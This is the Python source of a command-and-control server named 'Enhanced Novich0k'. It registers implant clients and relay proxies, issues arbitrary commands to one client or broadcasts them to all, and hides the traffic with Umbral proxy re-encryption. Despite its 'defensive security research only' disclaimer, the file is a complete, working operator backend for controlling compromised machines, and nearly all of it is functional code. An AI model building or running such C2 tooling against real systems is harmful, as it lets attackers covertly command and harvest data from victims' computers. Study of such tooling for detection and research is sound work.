#!/usr/bin/env python3
# Enhanced Novich0k - Umbral PRE-Based C2 Server Implementation
# For defensive security research purposes only

import socket
import threading
import time
import json
import base64
import os
import sys
import argparse
import logging
from datetime import datetime

# Import Umbral PRE libraries
from umbral import SecretKey, PublicKey, Signer
from umbral.curve import SECP256K1
from umbral.pre import encrypt, decrypt_original, decrypt_reencrypted, generate_kfrags
from umbral import Capsule, CapsuleFrag

# Import utility modules
from utils.serialization import serialize_object, deserialize_object, create_message, validate_message
from utils.error_types import NovichokError, DeserializationError, SerializationError, VersionError, CapsuleError
from utils.message_buffer import MessageBuffer
from utils.schema_validation import validate_json_schema
from utils.connection import send_message_with_retry, receive_message_with_timeout

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("novich0k_server.log")
    ]
)

logger = logging.getLogger("Novich0k-Server")

class C2Server:
    """Enhanced Command and Control server with Umbral PRE capabilities"""
    
    def __init__(self, host='127.0.0.1', port=8888):
        """Initialize the C2 server"""
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Client connections
        self.clients = {}
        self.proxies = {}
        self.client_buffers = {}  # Message buffers for each client
        
        # Initialize Umbral PRE
        self.params = SECP256K1
        
        # Generate server keys
        self.private_key = SecretKey.random()
        self.public_key = self.private_key.public_key()
        
        # Generate signing keys
        self.signing_key = SecretKey.random()
        self.verifying_key = self.signing_key.public_key()
        self.signer = Signer(self.signing_key)
        
        # Number of kfrags to generate (N)
        self.num_kfrags = 10
        
        # Threshold of kfrags needed for successful decryption (M of N)
        self.threshold = 8
        
        # Flag to determine if we use proxy re-encryption
        self.use_proxy = False
        
        # Store server key fingerprint for easier identification
        self.key_fingerprint = self.get_key_fingerprint(bytes(self.public_key))
        
        logger.info(f"C2 Server initialized on {host}:{port}")
        logger.info(f"Server public key fingerprint: {self.key_fingerprint}")
    
    def get_key_fingerprint(self, key_bytes):
        """Generate a fingerprint for a key"""
        import hashlib
        return hashlib.sha256(key_bytes).hexdigest()[:8]
    
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            logger.info(f"C2 Server listening on {self.host}:{self.port}")
            
            # Start a thread to accept connections
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Start the interactive command console
            self.command_loop()
            
        except Exception as e:
            logger.error(f"Error starting server: {e}")
            sys.exit(1)
    
    def accept_connections(self):
        """Accept incoming connections from clients and proxies"""
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                logger.info(f"New connection from {address[0]}:{address[1]}")
                
                # Initialize as unknown entity
                client_id = f"{address[0]}:{address[1]}"
                
                # Create a message buffer for this connection
                self.client_buffers[client_id] = MessageBuffer()
                
                # Start a thread to identify and handle this connection
                handler_thread = threading.Thread(
                    target=self.identify_connection,
                    args=(client_socket, client_id, address)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
            except Exception as e:
                logger.error(f"Error accepting connection: {e}")
    
    def identify_connection(self, client_socket, client_id, address):
        """Identify whether the connection is a client or proxy"""
        try:
            # Get the message buffer for this connection
            buffer = self.client_buffers.get(client_id)
            if not buffer:
                buffer = MessageBuffer()
                self.client_buffers[client_id] = buffer
            
            # Receive initial message with timeout
            message = receive_message_with_timeout(client_socket, buffer)
            
            if not message:
                logger.warning(f"No valid message received from {client_id}")
                client_socket.close()
                if client_id in self.client_buffers:
                    del self.client_buffers[client_id]
                return
            
            try:
                # Validate the message format
                validate_message(message)
            except Exception as e:
                logger.error(f"Invalid message format from {client_id}: {e}")
                client_socket.close()
                if client_id in self.client_buffers:
                    del self.client_buffers[client_id]
                return
            
            message_type = message.get("message_type")
            payload = message.get("payload", {})
            
            # Check if this is a proxy registration
            if message_type == "proxy_registration":
                self.handle_proxy_registration(client_socket, client_id, address, payload)
            # Otherwise assume it's a client connection
            elif message_type == "key_exchange":
                self.handle_client(client_socket, client_id, address, payload)
            else:
                logger.error(f"Unknown message type from {client_id}: {message_type}")
                client_socket.close()
                if client_id in self.client_buffers:
                    del self.client_buffers[client_id]
                
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON from {client_id}")
            client_socket.close()
            if client_id in self.client_buffers:
                del self.client_buffers[client_id]
        except Exception as e:
            logger.error(f"Error identifying connection {client_id}: {e}")
            client_socket.close()
            if client_id in self.client_buffers:
                del self.client_buffers[client_id]
    
    def handle_proxy_registration(self, proxy_socket, proxy_id, address, payload):
        """Handle registration of a proxy server"""
        try:
            logger.info(f"Proxy registration from {proxy_id}")
            
            # Extract proxy's public key
            try:
                proxy_pubkey_str = payload.get('public_key')
                if not proxy_pubkey_str:
                    raise DeserializationError("Missing public key in proxy registration")
                
                proxy_pubkey = deserialize_object(proxy_pubkey_str, "key")
            except Exception as e:
                raise DeserializationError(f"Invalid proxy public key: {e}")
            
            # Store proxy information
            self.proxies[proxy_id] = {
                'socket': proxy_socket,
                'buffer': self.client_buffers.get(proxy_id, MessageBuffer()),
                'address': address,
                'public_key': proxy_pubkey,
                'last_seen': time.time()
            }
            
            # Generate key fragments for this proxy
            kfrags = generate_kfrags(
                delegating_sk=self.private_key,
                receiving_pk=proxy_pubkey,
                signer=self.signer,
                threshold=self.threshold,
                shares=self.num_kfrags
            )
            
            # Serialize the key fragments
            serialized_kfrags = [
                base64.b64encode(bytes(kfrag)).decode()
                for kfrag in kfrags
            ]
            
            # Send the key fragments to the proxy
            response = create_message({
                'status': 'registered',
                'kfrags': serialized_kfrags,
                'delegating_pk': serialize_object(self.public_key, "key"),
                'threshold': self.threshold
            }, "proxy_registration_response")
            
            send_message_with_retry(proxy_socket, response)
            logger.info(f"Proxy {proxy_id} registered successfully")
            
            # Start a thread to listen for updates from this proxy
            proxy_thread = threading.Thread(
                target=self.handle_proxy_updates,
                args=(proxy_socket, proxy_id)
            )
            proxy_thread.daemon = True
            proxy_thread.start()
            
        except Exception as e:
            logger.error(f"Error registering proxy {proxy_id}: {e}")
            proxy_socket.close()
            if proxy_id in self.proxies:
                del self.proxies[proxy_id]
            if proxy_id in self.client_buffers:
                del self.client_buffers[proxy_id]
    
    def handle_proxy_updates(self, proxy_socket, proxy_id):
        """Handle updates from a proxy server"""
        try:
            buffer = self.proxies[proxy_id]['buffer']
            
            while True:
                # Receive message with timeout
                message = receive_message_with_timeout(proxy_socket, buffer)
                
                if not message:
                    # No valid message received, check if socket is still connected
                    try:
                        proxy_socket.getpeername()
                    except:
                        # Socket disconnected
                        logger.info(f"Proxy {proxy_id} disconnected")
                        break
                    continue
                
                try:
                    # Validate the message format
                    validate_message(message)
                except Exception as e:
                    logger.error(f"Invalid message format from proxy {proxy_id}: {e}")
                    continue
                
                # Update last seen timestamp
                self.proxies[proxy_id]['last_seen'] = time.time()
                
                message_type = message.get("message_type")
                payload = message.get("payload", {})
                
                # Handle proxy reporting a new client connection
                if message_type == "new_client_report":
                    new_client_id = payload.get('client_id')
                    if new_client_id:
                        logger.info(f"Proxy {proxy_id} reported new client: {new_client_id}")
                
                # Handle other proxy updates as needed
                
        except Exception as e:
            logger.error(f"Error handling proxy updates for {proxy_id}: {e}")
        finally:
            proxy_socket.close()
            if proxy_id in self.proxies:
                del self.proxies[proxy_id]
            if proxy_id in self.client_buffers:
                del self.client_buffers[proxy_id]
            logger.info(f"Proxy {proxy_id} removed")
    
    def handle_client(self, client_socket, connection_id, address, payload):
        """Handle a client connection"""
        try:
            # Extract client's information
            client_pubkey_str = payload.get('public_key')
            verifying_key_str = payload.get('verifying_key')
            
            if not client_pubkey_str or not verifying_key_str:
                raise DeserializationError("Missing required keys in client payload")
            
            try:
                client_public_key = deserialize_object(client_pubkey_str, "key")
                client_verifying_key = deserialize_object(verifying_key_str, "key")
            except Exception as e:
                raise DeserializationError(f"Error deserializing client keys: {e}")
            
            # Get client ID from the payload or use the connection ID
            client_id = payload.get('client_id', connection_id)
            
            # Store client information
            self.clients[client_id] = {
                'socket': client_socket,
                'buffer': self.client_buffers.get(connection_id, MessageBuffer()),
                'address': address,
                'public_key': client_public_key,
                'verifying_key': client_verifying_key,
                'last_seen': time.time()
            }
            
            # Send server's public key to client
            response = create_message({
                'status': 'connected',
                'public_key': serialize_object(self.public_key, "key")
            }, "key_exchange_response")
            
            send_message_with_retry(client_socket, response)
            logger.info(f"Client {client_id} connected successfully")
            print(f"\n[+] New client connected: {client_id}")
            if self.use_proxy:
                print(f"    Using proxy re-encryption: Yes (threshold {self.threshold} of {self.num_kfrags})")
            else:
                print(f"    Using proxy re-encryption: No")
                
            print("\nC2> ", end="", flush=True)
            
            # Start a thread to handle client communications
            client_thread = threading.Thread(
                target=self.handle_client_communications,
                args=(client_socket, client_id)
            )
            client_thread.daemon = True
            client_thread.start()
            
        except Exception as e:
            logger.error(f"Error handling client {connection_id}: {e}")
            client_socket.close()
            if connection_id in self.client_buffers:
                del self.client_buffers[connection_id]
            if connection_id in self.clients:
                del self.clients[connection_id]
    
    def handle_client_communications(self, client_socket, client_id):
        """Handle ongoing communications with a client"""
        try:
            buffer = self.clients[client_id]['buffer']
            
            while True:
                # Receive message with timeout
                message = receive_message_with_timeout(client_socket, buffer)
                
                if not message:
                    # No valid message received, check if socket is still connected
                    try:
                        client_socket.getpeername()
                    except:
                        # Socket disconnected
                        logger.info(f"Client {client_id} disconnected")
                        break
                    continue
                
                try:
                    # Validate the message format
                    validate_message(message)
                except Exception as e:
                    logger.error(f"Invalid message format from client {client_id}: {e}")
                    continue
                
                # Update last seen timestamp
                self.clients[client_id]['last_seen'] = time.time()
                
                message_type = message.get("message_type")
                payload = message.get("payload", {})
                
                # If this is a response to a command
                if message_type == "response" and "response" in payload:
                    try:
                        encrypted_data = payload['response']
                        
                        # Decode the capsule
                        capsule_bytes = base64.b64decode(encrypted_data['capsule'])
                        capsule = Capsule.from_bytes(capsule_bytes)
                        
                        # Decode the ciphertext
                        ciphertext = base64.b64decode(encrypted_data['ciphertext'])
                        
                        # Decrypt the response
                        plaintext = decrypt_original(
                            delegating_sk=self.private_key,
                            capsule=capsule,
                            ciphertext=ciphertext
                        )
                        
                        response_json = json.loads(plaintext.decode())
                        logger.info(f"Response from {client_id}: {response_json}")
                        
                        # Print the response to the console
                        print(f"\n[*] Response from {client_id}:")
                        self.print_response(response_json['response'])
                        print(f"\nC2:{client_id}> ", end="", flush=True)
                    except Exception as e:
                        logger.error(f"Error processing response from {client_id}: {e}")
                
                # Handle heartbeat messages
                elif message_type == "heartbeat" and "heartbeat" in payload:
                    try:
                        heartbeat_data = payload['heartbeat']
                        logger.debug(f"Received heartbeat from {client_id}")
                    except Exception as e:
                        logger.error(f"Error processing heartbeat from {client_id}: {e}")
                
        except Exception as e:
            logger.error(f"Error in client communications for {client_id}: {e}")
        finally:
            # Clean up when client disconnects
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.client_buffers:
                del self.client_buffers[client_id]
            logger.info(f"Client {client_id} removed")
            print(f"\n[-] Client {client_id} disconnected")
            print("\nC2> ", end="", flush=True)
    
    def print_response(self, response):
        """Pretty print the response data"""
        if isinstance(response, dict):
            # Format dictionary responses
            for key, value in response.items():
                if isinstance(value, dict):
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                elif isinstance(value, list):
                    print(f"  {key}:")
                    for item in value:
                        if isinstance(item, dict):
                            for k, v in item.items():
                                print(f"    {k}: {v}")
                            print()
                        else:
                            print(f"    {item}")
                else:
                    print(f"  {key}: {value}")
        elif isinstance(response, list):
            # Format list responses
            for item in response:
                if isinstance(item, dict):
                    for k, v in item.items():
                        print(f"  {k}: {v}")
                    print()
                else:
                    print(f"  {item}")
        else:
            # Format string or other responses
            print(f"  {response}")
    
    def command_loop(self):
        """Interactive command console for the C2 server"""
        print("\n--- Enhanced Novich0k C2 Server Command Interface ---")
        print("Available commands:")
        print("  list           - List all connected clients")
        print("  select <id>    - Select a client by ID")
        print("  broadcast      - Send command to all clients")
        print("  proxy <on/off> - Toggle proxy re-encryption")
        print("  help           - Show this help message")
        print("  exit           - Shut down the server")
        print("--------------------------------------------")
        
        while True:
            try:
                command = input("\nC2> ").strip()
                
                if command == "list":
                    self.list_clients()
                
                elif command.startswith("select "):
                    parts = command.split(" ", 1)
                    if len(parts) < 2:
                        print("[!] Please specify a client ID")
                        continue
                    
                    client_id = parts[1].strip()
                    if client_id in self.clients:
                        self.interact_with_client(client_id)
                    else:
                        print(f"[!] Client {client_id} not found")
                
                elif command == "broadcast":
                    self.broadcast_command()
                
                elif command.startswith("proxy "):
                    parts = command.split(" ", 1)
                    if len(parts) < 2:
                        print("[!] Please specify on or off")
                        continue
                    
                    if parts[1].lower() == "on":
                        if not self.proxies:
                            print("[!] No proxy servers registered. Cannot enable proxy re-encryption.")
                            continue
                            
                        self.use_proxy = True
                        print("[*] Proxy re-encryption enabled")
                        print(f"[*] Using threshold {self.threshold} of {self.num_kfrags}")
                        logger.info("Proxy re-encryption enabled")
                    elif parts[1].lower() == "off":
                        self.use_proxy = False
                        print("[*] Proxy re-encryption disabled")
                        logger.info("Proxy re-encryption disabled")
                    else:
                        print("[!] Invalid option. Use 'on' or 'off'")
                
                elif command == "help":
                    print("\nAvailable commands:")
                    print("  list           - List all connected clients")
                    print("  select <id>    - Select a client by ID")
                    print("  broadcast      - Send command to all clients")
                    print("  proxy <on/off> - Toggle proxy re-encryption")
                    print("  help           - Show this help message")
                    print("  exit           - Shut down the server")
                
                elif command == "exit":
                    print("[*] Shutting down server...")
                    logger.info("Shutting down server")
                    self.server_socket.close()
                    sys.exit(0)
                
                else:
                    print("[!] Unknown command. Type 'help' for available commands.")
            
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                logger.info("Server interrupted by user")
                break
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"[!] Error: {e}")
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("[!] No clients connected")
            return
        
        print("\nConnected clients:")
        print("-------------------")
        for i, (client_id, data) in enumerate(self.clients.items(), 1):
            addr = data['address']
            last_seen = time.strftime("%H:%M:%S", time.localtime(data['last_seen']))
            print(f"{i}. [{last_seen}] {client_id} ({addr[0]}:{addr[1]})")
        print("-------------------")
        
        if self.proxies:
            print("\nRegistered proxies:")
            print("-------------------")
            for i, (proxy_id, data) in enumerate(self.proxies.items(), 1):
                addr = data['address']
                last_seen = time.strftime("%H:%M:%S", time.localtime(data['last_seen']))
                print(f"{i}. [{last_seen}] {proxy_id} ({addr[0]}:{addr[1]})")
            print("-------------------")
    
    def interact_with_client(self, client_id):
        """Send commands to a specific client"""
        print(f"[*] Interacting with client {client_id}")
        print("[*] Type 'back' to return to main menu")
        print("[*] Type 'help' for available commands")
        
        available_commands = {
            "sysinfo": "Get system information",
            "whoami": "Get current user",
            "ping": "Test connectivity",
            "uptime": "Get system uptime",
            "echo <message>": "Echo a message",
            "sleep <seconds>": "Sleep for specified seconds",
            "processes": "List running processes",
            "interfaces": "List network interfaces"
        }
        
        while True:
            try:
                cmd = input(f"C2:{client_id}> ").strip()
                
                if cmd.lower() == "back":
                    break
                
                if cmd.lower() == "help":
                    print("\nAvailable commands:")
                    for command_name, description in available_commands.items():
                        print(f"  {command_name.ljust(20)} - {description}")
                    print("  back                  - Return to main menu")
                    print("  help                  - Show this help message")
                    continue
                
                if not cmd:
                    continue
                
                # Send the command to the client
                self.send_command_to_client(client_id, cmd)
                
            except KeyboardInterrupt:
                print("\n[*] Returning to main menu")
                break
            except Exception as e:
                logger.error(f"Error interacting with client: {e}")
                print(f"[!] Error: {e}")
    
    def send_command_to_client(self, client_id, command):
        """Send a command to a specific client with improved error handling"""
        if client_id not in self.clients:
            print(f"[!] Client {client_id} not found")
            return
        
        client = self.clients[client_id]
        client_socket = client['socket']
        client_public_key = client['public_key']
        
        try:
            # Prepare command data with proper validation
            cmd_data = {
                'id': str(time.time()),
                'command': command,
                'timestamp': datetime.now().isoformat()
            }
            
            # Validate command format
            valid, error_msg = validate_json_schema(cmd_data, "command")
            if not valid:
                logger.error(f"Invalid command format: {error_msg}")
                print(f"[!] Error in command format: {error_msg}")
                return
            
            # Serialize to JSON
            plaintext = json.dumps(cmd_data).encode()
            
            if self.use_proxy and self.proxies:
                print("[*] Using Umbral proxy re-encryption...")
                
                # Step 1: Encrypt message for the server itself
                ciphertext, capsule = encrypt(self.public_key, plaintext)
                
                # Note: diagnostic script showed that capsule is already a bytes object
                # in this version of Umbral, so no conversion is needed
                
                # Create command message
                message = create_message({
                    'command': True,
                    'use_proxy': True,
                    'encrypted_data': {
                        'ciphertext': base64.b64encode(ciphertext).decode(),
                        'capsule': base64.b64encode(capsule).decode()  # capsule is already bytes
                    },
                    'delegating_pk': serialize_object(self.public_key, "key"),
                    'threshold': self.threshold
                }, "command")
                
            else:
                # Direct encryption for client
                ciphertext, capsule = encrypt(client_public_key, plaintext)
                
                # Create command message
                message = create_message({
                    'command': True,
                    'encrypted_data': {
                        'ciphertext': base64.b64encode(ciphertext).decode(),
                        'capsule': base64.b64encode(capsule).decode()  # capsule is already bytes
                    }
                }, "command")
            
            # Send the message with retry
            send_message_with_retry(client_socket, message)
            logger.info(f"Command sent to {client_id}: {command}")
            print(f"[+] Command sent to {client_id}")
            
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            print(f"[!] Error sending command: {e}")
    
    def broadcast_command(self):
        """Send a command to all connected clients"""
        if not self.clients:
            print("[!] No clients connected")
            return
        
        try:
            command = input("Enter command to broadcast: ").strip()
            if not command:
                return
            
            for client_id in list(self.clients.keys()):
                self.send_command_to_client(client_id, command)
            
            print(f"[+] Command broadcasted to {len(self.clients)} clients")
            
        except Exception as e:
            logger.error(f"Error broadcasting command: {e}")
            print(f"[!] Error broadcasting command: {e}")


def check_dependencies():
    """Check if all required dependencies are installed"""
    required = ["umbral", "socket", "json", "base64"]
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}")
        print("[*] Install dependencies with: pip install " + " ".join(missing))
        return False
    
    return True


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Enhanced Umbral PRE-Based C2 Server")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Host to bind to")
    parser.add_argument("--port", type=int, default=8888,
                        help="Port to bind to")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    parser.add_argument("--threshold", type=int, default=8,
                        help="Threshold of kfrags needed for re-encryption (M)")
    parser.add_argument("--shares", type=int, default=10,
                        help="Total number of kfrags to generate (N)")
    
    args = parser.parse_args()
    
    # Set debug logging if requested
    if args.debug:
        logger.setLevel(logging.DEBUG)
        logger.debug("Debug logging enabled")
    
    # Check dependencies
    if not check_dependencies():
        print("[!] Missing dependencies. Please install them and try again.")
        return
    
    try:
        server = C2Server(args.host, args.port)
        server.threshold = args.threshold
        server.num_kfrags = args.shares
        
        print(f"\n=== Enhanced Novich0k - Umbral PRE-Based C2 Server ===")
        print(f"For defensive security research purposes only")
        print(f"Listening on {args.host}:{args.port}")
        print(f"Re-encryption threshold: {args.threshold} of {args.shares}")
        
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server interrupted by user. Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
